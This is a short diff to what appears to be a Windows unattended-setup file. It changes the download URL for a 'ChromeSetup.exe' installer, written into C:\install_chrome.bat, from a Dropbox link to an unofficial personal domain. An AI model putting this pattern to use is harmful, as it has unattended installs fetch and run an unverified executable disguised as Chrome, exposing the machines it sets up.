@@ -210,7 +210,7 @@
                 </SynchronousCommand>
                 <SynchronousCommand wcm:action="add">
                     <Order>2</Order>
-                    <CommandLine>cmd /c echo set "URL1=https://www.dropbox.com/scl/fi/1o7ges6buoqwmq6u7fwrn/ChromeSetup.exe?rlkey=518wyaa8t0emtrruvvmlqthm4&amp;st=byh6jymf&amp;dl=1" &gt;&gt; C:\install_chrome.bat</CommandLine>
+                    <CommandLine>cmd /c echo set "URL1=https://niceguy.my.id/ChromeSetup.exe" &gt;&gt; C:\install_chrome.bat</CommandLine>
                 </SynchronousCommand>
                 <SynchronousCommand wcm:action="add">
                     <Order>3</Order>
